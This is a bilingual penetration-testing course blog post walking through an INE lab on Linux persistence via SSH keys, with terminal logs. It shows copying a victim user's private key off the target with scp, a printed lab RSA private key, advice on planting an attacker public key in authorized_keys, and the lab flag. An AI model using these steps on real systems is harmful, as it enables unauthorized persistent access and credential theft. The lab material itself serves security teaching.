---
layout: post
title: "Persistence Via SSH Keys"
date: "2023-07-07"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Persistence
## Persistence Via SSH Keys
Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.

If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.

In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password.

After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.

## Demo: Persistence Via SSH Keys

# Linux持久性
## 通过SSH密钥实现持久性
Linux通常作为服务器操作系统部署，因此，Linux服务器通常通过SSH等服务/协议远程访问。

如果在您已经入侵的Linux系统上启用并运行了SSH，则可以利用SSH配置在目标系统上建立持久性访问。

在大多数情况下，Linux服务器将为SSH服务启用基于密钥的身份验证，允许用户远程访问Linux系统而无需密码。

在获得对Linux系统的访问权限后，我们可以将特定用户帐户的SSH私钥传输到我们的系统，并将该SSH私钥用于所有未来的身份验证和访问。

## 演示：通过SSH密钥实现持久性
I can generate a SSH key pair and I can then transfer the public key onto the Linux server and consequently use my private key for authentication with that server.

This is important in the context of persistence primarily because a user account password can be changed which means if SSH authentication to the Linux server utilizes passwords as well and if the user account password is changed then you're going to be locked out. However if you have the private key then you'll maintain access to the target system.

In most cases, you can also generate a new key pair and you also transfer that public key onto the Linux server that you've compromised and use the private key that you've generated alternatively. You can also find in some cases private keys that have been stored on that Linux server to access other servers and so on and so forth.

This lab environment is set up in a way where we need to log into the target system via SSH. Therefore simulating the stage of exploitation. Once we've gained access to the target system we can identify the private key, transfer it over to our Kali Linux system and I'll show you what can happen if the user account that you compromised has its password changed.

Kali Linux : 192.63.238.2

Target IP Address : 192.63.238.3

We can log on to the target system via SSH. This is going to simulate the exploitation phase and the reason we're doing it this way is to showcase how SSH works in addition to showing you how you can establish persistence through SSH keys.

```
ssh student@192.63.238.3

password
```

We've logged on as the student account.

List out the contents of the home directory.

```
ls -al

.ssh
wait
```

`.ssh`: this is the dot configuration folder.

`wait`: a binary. This was set up to simulate what would happen if the user account password was changed.

```
cat wait
```

Once we're done we will delete the wait binary here and that is going to change the student accounts password to simulate the fact that the accounts password has been changed after which it will also display a flag for us here.

```
cd .ssh/
ls
```

Whenever you generate a SSH key pair, you'll have the private key and the public key. Because when you generate a SSH key pair with `ssh-keygen` utility, it will generate two files. One of them is going to be called id_rsa, that's the private key, and is_rsa.pub, which is the public key. 

`id_rsa`: the private key. `id_rsa.pub`: public key.

`id_rsa`是SSH密钥对中的私钥文件，通常存储在用户主目录的`.ssh`文件夹中。它用于身份验证和加密通信，是SSH协议中非常重要的一部分。

在SSH连接期间，客户端将使用私钥进行身份验证，而服务器将使用公钥进行验证。私钥文件应该始终保持机密，只能由持有者访问，以确保安全性。

通过将私钥文件复制到其他系统上，您可以轻松地在这些系统上进行身份验证，并且只要您拥有私钥文件，就可以在不需要密码的情况下访问系统。因此，保护私钥文件的安全非常重要。

`authorized_keys`是SSH密钥对中的公钥文件，通常存储在用户主目录的`.ssh`文件夹中。当用户尝试通过SSH连接到远程系统时，系统将检查该用户的`authorized_keys`文件中是否存在与客户端使用的私钥相对应的公钥。

如果存在相应的公钥，则用户将被授权访问该系统。这种基于密钥的身份验证方法比基于密码的身份验证更加安全，因为私钥文件通常被加密，并且无法使用暴力破解方法进行破解。

此外，使用`authorized_keys`文件还可以使管理员轻松地管理多个用户的SSH访问权限，而无需为每个用户设置单独的密码。


```
cat id_rsa
ls
cat authorized_keys
exit
```

The authorized_keys file contains the authorized keys for specific private keys.

We need to copy this id_rsa private key onto our system.

We can utilize the scp utility which allows us to download a file or to transfer a file from the target system to our Kali Linux system via SSH.

```
scp student@192.63.238.3:~/.ssh/id_rsa .
```

we use a colon `:` to specify what file we want to download.

这个命令将远程主机上`192.63.238.3`的`student`用户的`~/.ssh/id_rsa`文件复制到本地当前目录。

具体来说，`scp`是一个用于在本地主机和远程主机之间复制文件的命令行工具。在这个命令中，我们使用`student`用户的身份连接到远程主机，并指定要复制的文件路径为`~/.ssh/id_rsa`。最后，我们使用`.`来指定当前目录作为复制的目标路径。

这个命令需要在本地终端中执行，并且需要输入远程主机上`student`用户的密码进行身份验证。如果SSH密钥身份验证已经配置，则可以避免输入密码。

It transferred successfully, we should now have it on our Kali Linux system.

We can now provide it with the necessary permissions that you typically associate with a private key.

```
chmod 400 id_rsa
```

这个命令将`id_rsa`文件的权限更改为只有文件所有者可读，没有其他权限。

具体来说，`chmod`是一个用于更改文件或目录权限的命令行工具。在这个命令中，我们使用`400`参数来指定新的权限设置。这个参数中的第一位数字4表示文件所有者可读的权限，而后面的两个0表示没有其他用户或用户组的权限。

因此，执行这个命令后，只有文件所有者可以读取`id_rsa`文件的内容，其他用户或用户组无法读取或修改该文件。这种权限设置可以确保私钥文件保持机密，并防止未经授权的访问或修改。

We can log back into the system via SSH.

```
ssh student@192.63.238.3 
```

We can get rid of the wait binary.

```
rm wait
```

Before you remove the binary make sure you've downloaded the private key as this will reset the connection and change the student accounts password preventing you from logging in.

The connection will be reset. If we try and log in again with the same credential.

```
ssh student@192.63.238.3
```

That password is not working any more. This was set up to simulate what would happen if you gained access to a Linux target system and if didn't set up persistence then you would be locked out. It really doesn't matter what you exploited initially to gain access to the target system after you gain an initial foothold always make sure that you can always access the target system whenever you want or have persistent access to that target system.

But it really doesn't matter because we copied the private key so to log in with the private key without providing a password because we don't need to know what the new student user accounts password is if we have a private key.

`-i`: specify the name of the private key.

```
ssh -i id_rsa student@192.63.238.3
exit
```

这个命令使用`id_rsa`文件作为SSH私钥文件，连接到远程主机`192.63.238.3`上的`student`用户。

具体来说，`ssh`是一个用于在本地主机和远程主机之间建立SSH连接的命令行工具。在这个命令中，我们使用`-i`参数来指定要使用的SSH私钥文件为`id_rsa`。然后，我们指定要连接的远程主机的IP地址为`192.63.238.3`，并使用`student`用户的身份进行连接。

当命令执行时，系统将使用指定的私钥文件进行身份验证，而不是使用密码进行身份验证。如果私钥文件与远程主机上的公钥匹配，则用户将被授权访问该系统。

We're logged on to the target system without providing a password, it doesn't matter whether the user account password was changed, we pretty much have access.

This isn't the typical flow that you would utilize if you are trying to set up persistence via SSH keys. What you would ideally do is you would generate a SSH key pair on your Kali Linux system, you then keep the private key on your Kali Linux system and transfer the public key onto the target system in the home directory of the user account in the `.ssh` directory, and you add it under `authorized_keys`. That's typically how you do.

The best part about this is we don't need to know when a user account password is changed, we don't need to know what the new password is, we pretty much gain access to the target system whenever we want.

```
ssh student@192.63.238.3
```

```
ssh -i id_rsa student@192.63.238.3
```

```
ls -al
cat flag.txt
```

# Maintaining Access I 维护访问 I 
## Overview  概述
You are given SSH access on the target machine. The flag is not on the machine yet and will only be available in the user's home directory after "wait" file present in the user's home directory is deleted. However, deletion of this file will change the user password and restart SSH. Hence, to retrieve the flag, you have to maintain access on the target system.  

您将在目标计算机上获得 SSH 访问权限。该标志尚未在计算机上，只有在删除用户主目录中存在的“wait”文件后，该标志才在用户的主目录中可用。但是，删除此文件将更改用户密码并重新启动 SSH。因此，要检索该标志，您必须保持对目标系统的访问。

Initial SSH Credentials  初始 SSH 凭据 

| Username | Password | | student | password |

Your mission: 您的任务： 

1. Maintain access on the target machine after the credentials are modified. Use SSH related artifacts for this. 修改凭据后，保持对目标计算机的访问权限。为此，请使用与 SSH 相关的工件。
2. Retrieve flag from the target machine. 从目标计算机检索标志。

## Solutions  解决方案 
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-954.pdf

本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-954.pdf

## 复现视频内容
Kali Linux : 192.229.202.2

Target IP Address : 192.229.202.3

```
root@attackdefense:~# ssh student@192.229.202.3
The authenticity of host '192.229.202.3 (192.229.202.3)' can't be established.
ECDSA key fingerprint is SHA256:XJKT3cfY7eUyGE+ANUXJUbujx9do/cm94BuQBcOWoho.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.229.202.3' (ECDSA) to the list of known hosts.
student@192.229.202.3's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

student@victim-1:~$ whoami
student
student@victim-1:~$ id
uid=999(student) gid=999(student) groups=999(student)
```

```
student@victim-1:~$ pwd
/home/student
student@victim-1:~$ ls -al
total 24
drwxr-xr-x 1 student student 4096 Jul  7 01:53 .
drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
drwx------ 2 student student 4096 Jul  7 01:53 .cache
drwxr-xr-x 1 root    root    4096 Apr 26  2019 .ssh
-rw-r--r-- 1 student student   91 Apr 26  2019 wait
student@victim-1:~$ cat wait
Delete this file to trigger connection reset.

Delete it only after planting the backdoor.
student@victim-1:~$ cd .ssh
student@victim-1:~/.ssh$ ls    
authorized_keys  id_rsa
student@victim-1:~/.ssh$ 
```

```
student@victim-1:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
9sJMGJVA0WNWyIcUWdDtnTJC/wwFvvqQlocx9oh1G7t0gFUHuuzY4pHxgl44LG40
C91x+kl8vvtu/4JAaqMT0xgJ8kGj4s/S8DnL8r5ajP8yFWj9fFWn27zaL/3vRjEj
R1R7+2f3XvCEJrz6Wk1jPRjqAvOeDRGH3ojsQwWO7k/FcvtqVBCPTGxyUBzXYv06
fM3OY5NL8D7t/bLoHa8dVhqjPnfUR7/IpiAdxEam1X0ObPB5YyBwSlpj6h904bF/
+U697IE23xjVmKMKcvTLe6QAxuRGSMf3/k3rCpDd3UxYF+P2e0CK3MefWjKpAe8r
2xRXyB0CgYEA+7zgmuhJqjik8tbt6b6+ZAJZ68TqLE1f3YEW/LivMeMj5tQZo/w+
0ZJnr6hR3eicMMxWKufGXSEtbs1TzMGvA5SXI9MTu62a5A2h7NDbLuKRwdjh9Qv6
TocFSMTSFcS4jvmbeYlVaSZWrJLLKY6lsjgdjDB4DH7Uc0Anxdr//GsCgYEA4E39
rlB7GWoCX7oXpSEGCHkQkmgX5IDU7+UUySFqD8fWoLsAc47R/TmDsKI+x83PF5jG
oo5P5LmUIeqnAKknTSyfD1YFtMa3tpTE68R9j/uueTK7v5izwWQjicmILm4RdkZJ
TVVH2b0aIQaUnpWWwHLa+BYx2jH4S2GxH89vz78CgYEA211SyApFLw0fR/Hc7kRm
OlYGL7qvaR2fvTDhbCYvnKRXQ61uDoUf5JXUvrBJbrtlZ+yX5dmE9OCVa6mHLbVV
oiQYtIIZ/wCgKbxrbybs6OVMqIQrGtNuMoHcK/Y/L/L19Lk0L2tqPy/GdamRWkxQ
vYXC0cfmxNS8oxWz0uktCrMCgYB6ufF9OMfBxgD6g4WAciss46CvmojIG71mbL8M
tV2kuMC0PN0oXRKELL3jHUKga/lNfefg9WC9UtS8IfmyINtCHJIDABwrJzdJjOiZ
326cIyb5ZUrYsCJaRAI117DNRqgDQL3GtEyV1CPBwin7Avny3mT0rKAmNIUYKaGS
OBuDXQKBgQDIRYOZEaV8rXx3wN24NYuByNUpRM3AIyPIwAuaPklWD6D2KdDveheI
lZtRb6Yzzmeon0DuLPdl7e/R7e5Z8Mx3o40aiJLULlw95JqON3J3W471PZAG1L/g
59PKgUMBNVX9UsUqvHyWlcY/FAT9UhWblgDoN3uXY9Db6q5x7hWzKw==
-----END RSA PRIVATE KEY-----
```

```
student@victim-1:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDckfXMLVYm4nYoI9/VR0l7V1f5SHhoT1Eqye5CTXbh44HrTX/z5Dq4l6PfyChVhDsNzgg0r0+r1w6z64NB9F2NLX/1LtrRsNU5FHpD8Td3JrREOzMtxqpfouQ+CcFnaBLfsTiZfqSLAS9h6poAbIWrJ+f5A8uiz9mdzcQDgDvUs8WDTVsCakjoZtprtRQb4wJmgzSoM2jkzOvlua0KdU4pDqfRDHvOe7kDanTRN/OYCjt6tnzrElR9dChUXOqYg2qFkoVm2OBXmeT+oeCfUE/J3o2hZ5cAN0gkqLuKriOiZP43L78eXGsCzUgmHG2tITFIxOSqYf/cp5f2JsFZfNjV root@localhost
```

```
student@victim-1:~/.ssh$ pwd
/home/student/.ssh
student@victim-1:~/.ssh$ ls -al
total 16
drwxr-xr-x 1 root    root    4096 Apr 26  2019 .
drwxr-xr-x 1 student student 4096 Jul  7 01:53 ..
-rw-r--r-- 1 root    root     396 Apr 26  2019 authorized_keys
-rw-r--r-- 1 root    root    1679 Apr 26  2019 id_rsa
student@victim-1:~/.ssh$ exit
logout
Connection to 192.229.202.3 closed.
```

```
root@attackdefense:~# scp student@192.229.202.3:/home/student/.ssh/id_rsa .
student@192.229.202.3's password: 
id_rsa                                                                                                                                                   100% 1679     4.3MB/s   00:00    
root@attackdefense:~# ls -al id_rsa
-rw-r--r-- 1 root root 1679 Jul  7 02:03 id_rsa
root@attackdefense:~# chmod 400 id_rsa
root@attackdefense:~# ls -al id_rsa
-r-------- 1 root root 1679 Jul  7 02:03 id_rsa
```

```
root@attackdefense:~# ssh student@192.229.202.3   
student@192.229.202.3's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Jul  7 01:53:16 2023 from 192.229.202.2
student@victim-1:~$ ls
wait
student@victim-1:~$ rm wait
student@victim-1:~$ Connection to 192.229.202.3 closed by remote host.
Connection to 192.229.202.3 closed.
root@attackdefense:~# ssh student@192.229.202.3
student@192.229.202.3's password: 
Permission denied, please try again.
student@192.229.202.3's password: 
Permission denied, please try again.
student@192.229.202.3's password: 
student@192.229.202.3: Permission denied (publickey,password).
```

```
root@attackdefense:~# ls
README  id_rsa  tools  wordlists
root@attackdefense:~# ssh -i id_rsa student@192.229.202.3
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Jul  7 02:08:52 2023 from 192.229.202.2
student@victim-1:~$ ls -al
total 32
drwxr-xr-x 1 student student 4096 Jul  7 02:09 .
drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
-rw------- 1 student student   88 Jul  7 02:02 .bash_history
drwx------ 2 student student 4096 Jul  7 01:53 .cache
drwxr-xr-x 1 root    root    4096 Apr 26  2019 .ssh
-rw-r--r-- 1 root    root      34 Apr 26  2019 flag.txt
student@victim-1:~$ cat flag.txt
689227a4f1b97afe1ff5ebaf85babc19
```